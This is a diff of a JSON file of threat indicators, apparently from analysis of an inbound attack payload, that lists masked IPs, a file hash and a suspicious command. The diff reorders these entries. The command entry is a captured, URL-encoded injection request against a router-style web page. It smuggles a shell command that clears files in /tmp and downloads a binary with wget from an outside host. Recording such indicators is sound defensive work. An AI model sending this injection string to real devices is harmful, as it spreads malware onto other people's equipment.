@@ -3,24 +3,24 @@
     "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
     "type": "ip",
-    "value": "190.179.168.XXX"
+    "value": "201.51.13.XXX"
   },
   {
     "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
     "type": "ip",
-    "value": "201.51.13.XXX"
-  },
-  {
-    "context": "Inbound payload hash (unknown)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "ecd9deac428f2300175f9d1d632b1da19a472b9ca932c9dfecd3327d1d618b11"
+    "value": "190.179.168.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "GET /chkisg.htm%3FSip%3D1.1.1.XXX%20%7C%20cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\\/201.51.13.XXX/mai"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "ecd9deac428f2300175f9d1d632b1da19a472b9ca932c9dfecd3327d1d618b11"
   }
 ]
